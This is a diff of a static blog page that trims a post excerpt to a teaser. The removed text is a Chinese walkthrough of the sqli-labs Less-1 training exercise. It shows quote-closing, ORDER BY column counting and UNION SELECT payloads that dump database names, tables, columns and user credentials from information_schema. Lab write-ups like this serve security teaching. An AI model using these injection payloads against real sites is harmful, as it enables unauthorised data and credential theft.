@@ -371,130 +371,20 @@
 
       
         
-          
-            <a id="more"></a>
-<hr>
-<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><pre><code>首先传入id发现都能显示
-
-猜测后台传参形式大概是这样
-
-select ... from ... where id =&apos;1&apos;
-
-试着闭合一下
-
-传入id=1&apos;
-
-发现报错
-
-传入id=1&apos;%23
-
-发现正确
-
-所以猜想应该正确~
-
-
-接着试着查看该表的列
-
-传入id=1&apos; order by 4
-
-显示不存在
-
-传入id=1&apos; order by 3可以
-
-说明该表有三列
-
-
-
-
-
- 接下来爆数据库吧 
-
-
-
-
-我们已知information_schema存储了其他数据库信息
-
-所以使用union来执行查询数据库
-
-因为union需要前后sql语句选择的列数相同,当前一个语句选择的内容为
-
-空，就将后面的语句的内容显示出来所以传入
-
-id=-1&apos; union select 1,group_concat(schema_name),3 from 
-
-information_schema.schemata%23
-
-爆出数据库
-
-information_schema,challenges,dedecmsv57utf8sp2,mysql,
-
-performance_schema,security,test,wordpress,wordpress2
-
-
-
-
-
-现在一直数据库了想看看数据库中的表
-
-id=-1&apos; union select 1,group_concat(table_name),3 from 
-
-information_schema.tables where 
-
-table_schema=&apos;security&apos;%23
-
-爆出表了
-
-emails,referers,uagents,users
-
-
-
-
-
-还想看看表里有啥？
-
-满足你！
-
-id=-1&apos; union select 1,group_concat(column_name),3 from
-
- information_schema.columns where table_name=&apos;users&apos;%23
-
-爆出列了
-id,username,password
-
-都到这里了看看数据吧~
-
-id=-1&apos; union select 1,username,password from users 
-
-where
-
- id=&apos;3&apos;%23
-
-(貌似加不加单引号没影响？)
-
-
-
-数据库
-
-schema_name
-
-information_schema.schemata
-</code></pre><hr>
-<pre><code>表    
-
-table_name
-
-information_schema.tables
-</code></pre><hr>
-<pre><code>列
-
-column_name
-
-information_schema.columns
-</code></pre>
-          
+          <h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>首先传入id发现都能显示</p>
+<p>猜测后台传参形式大概是这样</p>
+<p>select … from … where id =’1’</p>
+<p>试着闭合一下<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/19/sqli-labs-master/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
-    </div>
+    </p></div>
     
     
     
